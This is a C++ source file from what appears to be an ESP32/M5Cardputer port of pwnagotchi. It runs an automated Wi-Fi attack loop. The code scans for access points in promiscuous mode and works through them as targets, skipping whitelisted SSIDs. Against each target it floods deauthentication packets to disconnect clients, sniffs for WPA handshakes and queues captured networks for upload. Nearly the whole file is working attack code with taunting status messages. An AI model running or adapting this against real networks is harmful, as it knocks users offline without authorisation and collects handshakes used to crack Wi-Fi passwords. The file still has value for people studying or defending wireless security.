#include "pwnagothi.h"
#include "WiFi.h"
#include "logger.h"
#include "settings.h"
#include "ArduinoJson.h"
#include "mood.h"
#include "networkKit.h"
#include "EapolSniffer.h"
#include "ui.h"
#include <vector>
#include "pwngrid.h"
#include "api_client.h"

bool pwnagothiModeEnabled;
bool pwnagothiScan = true;
bool nextWiFiCheck = false;

std::vector<wifiSpeedScan> g_speedScanResults;

std::vector<wifiSpeedScan> getSpeedScanResults(){
    return g_speedScanResults;
}

void speedScanCallback(void* buf, wifi_promiscuous_pkt_type_t type){
    if(type != WIFI_PKT_MGMT){
        return;
    }
    logMessage("Mgmt packet received in speedScanCallback");
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    
    if(pkt->rx_ctrl.sig_len < 36){ // minimal length for beacon frame
        logMessage("Packet too short to be a beacon frame.");
        return;
    }
    if ((pkt->payload[0] & 0xF0) != 0x80) return;  // 0x80 = beacon frame subtype


    int8_t rssi = pkt->rx_ctrl.rssi;
    uint8_t bssid[6];
    memcpy(bssid, pkt->payload + 10, 6);
    uint8_t channel = pkt->rx_ctrl.channel;
    // read channel from DS Parameter Set (tag 3) in the tagged parameters (fallback to radio channel)
    uint8_t ap_channel = channel;
    if (pkt->rx_ctrl.sig_len > 36) {
        int pos_ch = 36; // start of tagged parameters
        while (pos_ch + 2 <= pkt->rx_ctrl.sig_len - 1) {
            uint8_t tag = pkt->payload[pos_ch];
            uint8_t len = pkt->payload[pos_ch + 1];
            if (pos_ch + 2 + len > pkt->rx_ctrl.sig_len) break; // bounds check
            if (tag == 3 && len == 1) { // DS Parameter Set - current channel
                ap_channel = pkt->payload[pos_ch + 2];
                break;
            }
            pos_ch += 2 + len;
        }
    }
    channel = ap_channel;

    // capability info is at offsets 34..35 (fixed fields end at 36). privacy bit (0x0010) indicates security.
    uint16_t cap = (uint16_t)pkt->payload[34] | ((uint16_t)pkt->payload[35] << 8);
    bool secure = (cap & 0x0010) != 0;
    int ssid_len = pkt->payload[0x1F];
    String ssid = "";
    int pos = 36; // start of tagged parameters
    while (pos < pkt->rx_ctrl.sig_len - 2) {
        uint8_t tag = pkt->payload[pos];
        uint8_t len = pkt->payload[pos + 1];
        if (tag == 0 && len <= 32) { // SSID tag
            ssid = String((char*)(pkt->payload + pos + 2)).substring(0, len);
            break;
        }
        pos += 2 + len;
    }
    // Check for duplicates, then add if new to vector list
    for(auto &entry : g_speedScanResults){
        if(entry.ssid == ssid && entry.channel == channel){
            logMessage("Duplicate SSID detected: " + ssid + " on channel " + String(channel));
            return; // already exists
        }
    }
    g_speedScanResults.push_back({ssid, rssi, channel, secure, {bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]}});
}

void speedScan(){
    logMessage("Starting speed scan...");
    g_speedScanResults.clear();
    //go quickly through channels 1-13
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(speedScanCallback);
    for(int ch = 1; ch <= 13; ch++){
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        delay(120); // dwell time on each channel - adjust as needed
    }
    logMessage("Speed scan completed, found " + String(g_speedScanResults.size()) + " unique SSIDs.");
    esp_wifi_set_promiscuous(false);
    for(auto &entry : g_speedScanResults){
        logMessage("SSID: " + entry.ssid + " | RSSI: " + String(entry.rssi) + " | Channel: " + String(entry.channel) + " | Secure: " + String(entry.secure));
    }
}


void speedScanTestAndPrintResults(){
    logMessage("Testing speed scan function...");
    long timeStart = millis();
    speedScan();
    logMessage("Speed scan results:");
    for(auto &entry : g_speedScanResults){
        logMessage("SSID: " + entry.ssid + " | RSSI: " + String(entry.rssi) + " | Channel: " + String(entry.channel) + " | Secure: " + String(entry.secure));
    }
    logMessage("Speed scan took " + String(millis() - timeStart) + " ms.");
    timeStart = millis();
    WiFi.scanNetworks();
    logMessage("Regular scan results: " + String(WiFi.scanComplete()) + " networks found.");
    for(int i = 0; i < WiFi.scanComplete(); i++){
        logMessage("SSID: " + WiFi.SSID(i) + " | RSSI: " + String(WiFi.RSSI(i)) + " | Channel: " + String(WiFi.channel(i)) + " | Secure: " + String(WiFi.encryptionType(i) != WIFI_AUTH_OPEN));
    }
    logMessage("Regular scan took " + String(millis() - timeStart) + " ms.");
}

bool pwnagothiBegin(){
    if(initPersonality() == false){
        logMessage("Personality init failed");
        return false;
    }
    if(!(wifion())){
        logMessage("WiFi init failed");
        return false;
    }   
    setMood(1, "(o_o)", "3 seconds for auto mode start... ESC to cancel");
    updateUi(true, false);
    uint32_t start = millis();
    while(millis() - start < 3000){
        M5.update();
        M5Cardputer.update();
        auto status = M5Cardputer.Keyboard.keysState();
        for(auto i : status.word){
            if(i=='`'){
                setMood(1, "(^_^)", "Pwnagothi mode cancelled");
                updateUi(true, false);
                return false;
            }
        }
    }
    logMessage("Pwnagothi auto mode init!");
    parseWhitelist();
    pwnagothiMode = true;
    return true;
}

// maximum entries we'll accept from the JSON whitelist to avoid OOM
static const size_t MAX_WHITELIST = 200;

std::vector<String> parseWhitelist() {
    JsonDocument doc;

    DeserializationError err = deserializeJson(doc, whitelist);
    if (err) {
        logMessage(String("Failed to parse whitelist JSON: ") + err.c_str());
        return std::vector<String>(); // empty vector
    }

    JsonArray arr = doc.as<JsonArray>();
    size_t actualSize = arr.size();
    if (actualSize > MAX_WHITELIST) {
        logMessage(String("Whitelist contains ") + String(actualSize)
                   + " entries; truncating to " + String(MAX_WHITELIST));
        actualSize = MAX_WHITELIST;
    }

    std::vector<String> result;
    result.reserve(actualSize); // reduce fragmentation / reallocation

    size_t i = 0;
    for (JsonVariant v : arr) {
        if (i++ >= actualSize) break;
        const char* s = v.as<const char*>();
        if (s) result.emplace_back(String(s));
        else result.emplace_back(String()); // keep index consistent
    }

    return result;
}

void addToWhitelist(const String &valueToAdd) {
    JsonDocument oldDoc;
    DeserializationError err = deserializeJson(oldDoc, whitelist);
    if (err) {
        // treat as empty array if parse fails
        oldDoc.to<JsonArray>();
    }

    JsonArray oldArr = oldDoc.as<JsonArray>();

    // make new doc sized for old + one more (rough estimate)
    JsonDocument newDoc;
    JsonArray newArr = newDoc.to<JsonArray>();

    size_t count = 0;
    for (JsonVariant v : oldArr) {
        if (count++ >= MAX_WHITELIST) break;
        newArr.add(v.as<const char*>());
    }

    if (count < MAX_WHITELIST) {
        newArr.add(valueToAdd.c_str());
    } else {
        logMessage("Whitelist at capacity, not adding: " + valueToAdd);
    }

    String out;
    serializeJson(newDoc, out);
    whitelist = out;
    saveSettings();
}

uint8_t wifiCheckInt = 0;

void pwnagothiLoop(){
    if(pwnagothiScan){
        logMessage("(<_>) Speed scanning..");
        setMood(1, "(<_>)", "Speed scanning..");
        pwngridAdvertise(1, "(<_>)");
        updateUi(true, false);
        g_speedScanResults.clear();
        // run promiscuous fast scan
        speedScan();
        if(!g_speedScanResults.empty()){
            wifiCheckInt = 0;
            pwnagothiScan = false;
            logMessage("(*_*) Speed scan completed proceding to attack!");
            setMood(1, "(*_*)", "Speed scan completed proceding to attack!");
            pwngridAdvertise(1, "(*_*)");
            updateUi(true, false);
            delay(pwnagotchi.delay_after_wifi_scan);
        } else {
            logMessage("('_') No networks found by speed scan. Falling back to slow scan and retrying.");
            pwngridAdvertise(1, "('_')");
            updateUi(true, false);
            WiFi.scanNetworks();
            delay(pwnagotchi.delay_after_no_networks_found);
            pwnagothiScan = true;
            return;
        }
    }
    else{
        // ensure we have results and index is in range
        if(g_speedScanResults.empty()){
            logMessage("('_') No speed-scan results available, re-scheduling scan.");
            pwngridAdvertise(1, "('_')");
            pwnagothiScan = true;
            return;
        }
        if(wifiCheckInt >= g_speedScanResults.size()){
            logMessage("Reached end of speed-scan results, scheduling new scan.");
            pwnagothiScan = true;
            return;
        }

        auto &entry = g_speedScanResults[wifiCheckInt];
        String attackVector = entry.ssid;
        // handle empty SSID entry
        if(attackVector.length() == 0){
            logMessage("('_') Encountered hidden/empty SSID, skipping.");
            wifiCheckInt++;
            return;
        }

        setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
        logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
        pwngridAdvertise(1, "(@_@)");
        updateUi(true, false);
        delay(pwnagotchi.delay_after_picking_target);

        // whitelist check
        std::vector<String> whitelistParsed = parseWhitelist();
        for (size_t i = 0; i < whitelistParsed.size(); ++i) {
            logMessage("Whitelist check...");
            if (whitelistParsed[i] == attackVector) {
                // safe -> skip
                setMood(1, "(x_x)", "Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                logMessage("(x_x) Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                pwngridAdvertise(1, "(x_x)");
                updateUi(true, false);
                wifiCheckInt++;
                return;
            }
        }

        // prepare attack using speed-scan info
        updateUi(true, false);
        if(setMac(&entry.bssid[0])){
            logMessage("Target MAC set to: " + attackVector);
        }
        else{
            logMessage("Failed to set target MAC for: " + attackVector);
            logMessage("Skipping to next target.");
            wifiCheckInt++;
            return;
        }
        setMood(1 , "(@_@)", "WELL, Everyone is OUT!");
        pwngridAdvertise(1, "(@_@)");
        logMessage("(@_@) WELL, Everyone is OUT!");
        updateUi(true, false);
        setTargetAP(&entry.bssid[0], attackVector);

        uint16_t targetChannel = entry.channel ? entry.channel : 1;
        if(pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChannel);
        }

        if(deauth_everyone(pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay)){
            logMessage("Deauth succesful, proceeding to sniff...");
        }
        else{
            logMessage("Unknown error with deauth or deauth disabled!");
            if(!pwnagotchi.deauth_on){
                logMessage("Deauth disabled in settings, proceeding to sniff...");
            }
            else{
                return;
            }
        }

        setMood(1, "(@--@)", "Sniff, sniff... Looking for handshake..." );
        logMessage("(@--@) Sniff, sniff... Looking for handshake...");
        pwngridAdvertise(1, "(@--@)");
        updateUi(true, false);
        unsigned long startTime1 = millis();

        if(!pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChannel);
        }

        while(true){
            SnifferLoop();
            updateUi(true, false);
            delay(10);

            if (SnifferGetClientCount() > 0) {
                // ensure we consume pending packets
                while (SnifferPendingPackets() > 0) {
                    SnifferLoop();
                    updateUi(true, false);
                }
                setMood(1, "(^_^)", "Got new handshake!!!" );
                logMessage("(^_^) Got new handshake!!!");
                api_client::queueAPForUpload(attackVector, String(entry.bssid[0], HEX) + ":" + String(entry.bssid[1], HEX) + ":" + String(entry.bssid[2], HEX) + ":" + String(entry.bssid[3], HEX) + ":" + String(entry.bssid[4], HEX) + ":" + String(entry.bssid[5], HEX));
                pwngridAdvertise(1, "(^_^)");
                lastPwnedAP = attackVector;
                updateUi(true, false);
                SnifferEnd();
                initPwngrid();
                pwned_ap++;
                sessionCaptures++;
                wifiCheckInt++;
                if(pwnagotchi.sound_on_events){
                    Sound(1500, 100, true);
                    Sound(2000, 100, true);
                    Sound(2500, 150, true);
                }
                if(pwnagotchi.add_to_whitelist_on_success){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                }
                else{
                    logMessage(attackVector + " not added to whitelist");
                }
                saveSettings();
                delay(pwnagotchi.delay_after_successful_attack);
                break;
            }

            if (millis() - startTime1 > pwnagotchi.handshake_wait_time) {
                setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
                pwngridAdvertise(1, "(~_~)");
                logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                SnifferEnd();
                initPwngrid();
                updateUi(true, false);

                delay(pwnagotchi.delay_after_attack_fail);
                if(pwnagotchi.add_to_whitelist_on_fail){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                    saveSettings();
                }
                wifiCheckInt++;
                if(pwnagotchi.sound_on_events){
                    Sound(800, 150, true);
                    Sound(500, 150, true);
                    Sound(300, 200, true);
                }
                break;
            }
        }
    }

    setMood(1, "(>_<)", "Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
    logMessage("(>_<) Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
    pwngridAdvertise(1, "(>_<)");
    updateUi(true, false);
    delay(pwnagotchi.nap_time);
}

void pwnagothiStealthLoop(){
    if(pwnagothiScan){
        logMessage("(<_>) Scanning..");
        pwngridAdvertise(1, "(<_>)");
        setMood(1, "(<_>)", "Scanning..");
        updateUi(true, false);
        WiFi.scanNetworks();
        if((WiFi.scanComplete()) >= 0){
            wifiCheckInt = 0;
            pwnagothiScan = false;
            logMessage("(*_*) Scan compleated proceding to attack!");
            setMood(1, "(*_*)", "Scan compleated proceding to attack!");
            pwngridAdvertise(1, "(*_*)");
            updateUi(true, false);
            delay(pwnagotchi.delay_after_wifi_scan);
        }
    }
    else{
        setMood(1, "(z-z)", "waiting...");
        pwngridAdvertise(1, "(z-z)");
        updateUi(true, false);
        delay(pwnagotchi.delay_before_switching_target);
        String attackVector;
        if(!WiFi.SSID(0)){
            logMessage("('_') No networks found. Waiting and retrying");
            pwngridAdvertise(1, "('_')");
            setMood(1, "('_')", "No networks found. Waiting and retrying");
            updateUi(true, false);
            delay(pwnagotchi.delay_after_no_networks_found);
            pwnagothiScan = true;
        }
        if(wifiCheckInt < WiFi.scanComplete()){
            logMessage("Vector name filled: " + WiFi.SSID(wifiCheckInt));
        }
        else{
            pwnagothiScan = true;
            return;
        }
        attackVector = WiFi.SSID(wifiCheckInt);
        setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
        logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
        pwngridAdvertise(1, "(@_@)");
        updateUi(true, false);
        delay(pwnagotchi.delay_after_picking_target);
        std::vector<String> whitelistParsed = parseWhitelist();
        for (size_t i = 0; i < whitelistParsed.size(); ++i) {
            logMessage("Whitelist check...");
            if (whitelistParsed[i] == attackVector) {
                // safe -> skip
                setMood(1, "(x_x)", "Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                logMessage("(x_x) Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                updateUi(true, false);
                wifiCheckInt++;
                return;
            }
        }
        setMood(1, "(Y_Y)" , "I'm looking inside you " + attackVector + "...");
        updateUi(true, false);
        set_target_channel(attackVector.c_str());
        uint8_t i = 0;
        uint8_t currentCount = SnifferGetClientCount();
        if(!setMac(WiFi.BSSID(wifiCheckInt))){
            logMessage("Failed to set target MAC for: " + attackVector);
            logMessage("Skipping to next target.");
            wifiCheckInt++;
            return;
        }
        uint16_t targetChanel;
        uint8_t result = set_target_channel(attackVector.c_str());
        if (result != 0) { //if wifi is not found, enviroment had changed, so rescan to avoid kernel panic
            targetChanel = result;
        } else {
            pwnagothiScan = false;
            return;
        }
        initClientSniffing();
        String clients[50];
        int clientLen;
        unsigned long startTime = millis();
        logMessage("Waiting for clients to connect to " + attackVector);
        while(true){
            get_clients_list(clients, clientLen);
            if (millis() - startTime > pwnagotchi.client_discovery_timeout) {
                setMood(1, "(~_~)", "Attack failed: Timeout waiting for client.");
                logMessage("(~_~) Attack failed: Timeout waiting for client.");
                SnifferEnd();
                updateUi(true, false);
                delay(pwnagotchi.delay_after_no_clients_found);
                wifiCheckInt++;
                return;
            }
            if(!clients[i].isEmpty()){
                logMessage("Client count: " + String(clientLen));
                setMood(1, "(d_b)", "I think that " + clients[i] + " doesn't need an internet..." );
                logMessage("WiFi BSSIS is: " + WiFi.BSSIDstr(wifiCheckInt));
                logMessage("Client BSSID is: "+ clients[clientLen]);
                logMessage("(d_b) I think that " + clients[i] + "doesn't need an internet...");
                pwngridAdvertise(1, "(d_b)");
                updateUi(true, false);
                delay(pwnagotchi.delay_after_client_found);
                stopClientSniffing();
                break;
            }
            updateUi(true, false);
        }
        setMood(1, "(O_o)", "Well, well, well  " + clients[i] + " you're OUT!!!" );
        logMessage("(O_o) Well, well, well  " + clients[i] + " you're OUT!!!");
        pwngridAdvertise(1, "(O_o)");
        updateUi(true, false);
        setTargetAP(WiFi.BSSID(wifiCheckInt));
        if(pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChanel);
        }
        if(send_deauth_packets(clients[i], pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay) && (pwnagotchi.deauth_on)){
            logMessage("Deauth succesful, proceeding to sniff...");
        }
        else{
            logMessage("Unknown error with deauth or deauth disabled!");
            if(!pwnagotchi.deauth_on){
                logMessage("Deauth disabled in settings, proceeding to sniff...");
            }
            else{
                return;
            }
        }
        setMood(1, "(@--@)", "Sniff, sniff... Looking for handshake..." );
        logMessage("(@--@) Sniff, sniff... Looking for handshake...");
        pwngridAdvertise(1, "(@--@)");
        updateUi(true, false);
        unsigned long startTime1 = millis();
        if(!pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChanel);
        }
        while(true){
            SnifferLoop();
            updateUi(true, false);
            delay(10);
            if (SnifferGetClientCount() > 0) {
                while (SnifferPendingPackets() > 0) {
                    SnifferLoop();
                    updateUi(true, false);
                }
                setMood(1, "(^_^)", "Got new handshake!!!" );
                logMessage("(^_^) Got new handshake!!!");
                pwngridAdvertise(1, "(^_^)");
                lastPwnedAP = attackVector;
                updateUi(true, false);
                SnifferEnd();
                initPwngrid();
                pwned_ap++;
                sessionCaptures++;
                wifiCheckInt++;
                if(pwnagotchi.sound_on_events){
                    Sound(1500, 100, true);
                    Sound(2000, 100, true);
                    Sound(2500, 150, true);
                }
                if(pwnagotchi.add_to_whitelist_on_success){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                }
                else{
                    logMessage(attackVector + " not added to whitelist");
                }
                saveSettings();
                delay(pwnagotchi.delay_after_successful_attack);
                break;
            }
            if (millis() - startTime1 > pwnagotchi.handshake_wait_time) { // 20 seconds timeout
                setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
                logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                SnifferEnd();
                initPwngrid();
                updateUi(true, false);
                
                delay(pwnagotchi.delay_after_attack_fail);
                if(pwnagotchi.add_to_whitelist_on_fail){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                    saveSettings();
                }
                wifiCheckInt++;
                if(pwnagotchi.sound_on_events){
                    Sound(800, 150, true);
                    Sound(500, 150, true);
                    Sound(300, 200, true);
                }
                break;
            }
        }
    }
    setMood(1, "(>_<)", "Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
    logMessage("(>_<) Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
    updateUi(true, false);
    delay(pwnagotchi.nap_time);
} 

void removeItemFromWhitelist(String valueToRemove) {
    JsonDocument oldList;
    deserializeJson(oldList, whitelist);
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    JsonArray oldArray = oldList.as<JsonArray>();
    
    for (JsonVariant v : oldArray) {
        String item = String(v.as<const char*>());
        if (item != valueToRemove) {
            array.add(item);
        }
    }
    
    String newWhitelist;
    serializeJson(list, newWhitelist);
    whitelist = newWhitelist;
    saveSettings();
}
